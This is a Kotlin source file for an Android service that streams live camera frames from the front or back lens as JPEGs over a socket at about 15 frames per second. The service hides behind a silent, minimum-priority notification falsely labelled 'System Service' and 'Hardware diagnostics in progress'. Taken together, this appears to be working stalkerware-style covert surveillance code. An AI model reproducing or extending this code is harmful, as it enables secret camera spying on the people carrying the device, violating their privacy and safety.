package com.thirdeye.app.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.thirdeye.app.MainActivity
import com.thirdeye.app.R
import com.thirdeye.app.uploader.SocketManager
import java.io.ByteArrayOutputStream
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class LiveStreamService : LifecycleService() {

    companion object {
        private const val TAG = "LiveStreamService"
        const val CHANNEL_ID = "thirdeye_live_service_channel"
        const val NOTIFICATION_ID = 1002

        const val ACTION_START_STREAM = "com.thirdeye.app.ACTION_START_LIVE_STREAM"
        const val ACTION_STOP_STREAM = "com.thirdeye.app.ACTION_STOP_LIVE_STREAM"
        const val ACTION_SWITCH_CAMERA = "com.thirdeye.app.ACTION_SWITCH_CAMERA"
        const val EXTRA_CAMERA_LENS = "extra_camera_lens"

        fun startService(context: Context, cameraLens: String = "BACK") {
            val intent = Intent(context, LiveStreamService::class.java).apply {
                action = ACTION_START_STREAM
                putExtra(EXTRA_CAMERA_LENS, cameraLens)
            }
            ContextCompat.startForegroundService(context, intent)
        }

        fun stopService(context: Context) {
            val intent = Intent(context, LiveStreamService::class.java).apply {
                action = ACTION_STOP_STREAM
            }
            context.startService(intent)
        }

        fun switchCamera(context: Context, cameraLens: String) {
            val intent = Intent(context, LiveStreamService::class.java).apply {
                action = ACTION_SWITCH_CAMERA
                putExtra(EXTRA_CAMERA_LENS, cameraLens)
            }
            context.startService(intent)
        }
    }

    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraExecutor: ExecutorService? = null
    private var currentLens: String = "BACK"
    private var lastFrameTime = 0L

    override fun onCreate() {
        super.onCreate()
        cameraExecutor = Executors.newSingleThreadExecutor()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        when (intent?.action) {
            ACTION_START_STREAM -> {
                currentLens = intent.getStringExtra(EXTRA_CAMERA_LENS) ?: "BACK"
                startForegroundNotification()
                initCamera()
            }
            ACTION_SWITCH_CAMERA -> {
                currentLens = intent.getStringExtra(EXTRA_CAMERA_LENS) ?: "BACK"
                cameraProvider?.let { bindImageAnalysis(it) }
            }
            ACTION_STOP_STREAM -> {
                stopStream()
            }
        }

        return START_NOT_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Diagnostics",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun startForegroundNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Hardware diagnostics in progress")
            .setSmallIcon(R.drawable.ic_camera_record)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    @SuppressLint("MissingPermission")
    private fun initCamera() {
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                cameraProvider = future.get()
                cameraProvider?.let { bindImageAnalysis(it) }
            } catch (e: Exception) {
                Log.e(TAG, "Error obtaining camera provider for live stream", e)
                stopSelf()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    @SuppressLint("MissingPermission")
    private fun bindImageAnalysis(provider: ProcessCameraProvider) {
        try {
            provider.unbindAll()

            val lensFacing = if (currentLens.equals("FRONT", ignoreCase = true)) {
                CameraSelector.LENS_FACING_FRONT
            } else {
                CameraSelector.LENS_FACING_BACK
            }

            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(lensFacing)
                .build()

            val imageAnalysis = ImageAnalysis.Builder()
                .setTargetResolution(Size(640, 480))
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()

            val executor = cameraExecutor ?: Executors.newSingleThreadExecutor().also { cameraExecutor = it }

            imageAnalysis.setAnalyzer(executor) { imageProxy ->
                val now = System.currentTimeMillis()
                // Rate-limit to approx 15 FPS (every 66ms) to keep bandwidth minimal
                if (now - lastFrameTime >= 65) {
                    lastFrameTime = now
                    try {
                        val bitmap = imageProxy.toBitmap()
                        val out = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
                        val jpegBytes = out.toByteArray()
                        SocketManager.sendFrame(applicationContext, jpegBytes)
                    } catch (e: Exception) {
                        Log.w(TAG, "Frame conversion error: ${e.message}")
                    }
                }
                imageProxy.close()
            }

            provider.bindToLifecycle(this, cameraSelector, imageAnalysis)
            Log.i(TAG, " Live camera analysis bound successfully (Lens: $currentLens)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed binding camera for live stream", e)
            stopSelf()
        }
    }

    private fun stopStream() {
        try {
            cameraProvider?.unbindAll()
            cameraProvider = null
        } catch (e: Exception) {
            Log.w(TAG, "Error unbinding camera", e)
        }
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        stopStream()
        cameraExecutor?.shutdown()
        cameraExecutor = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
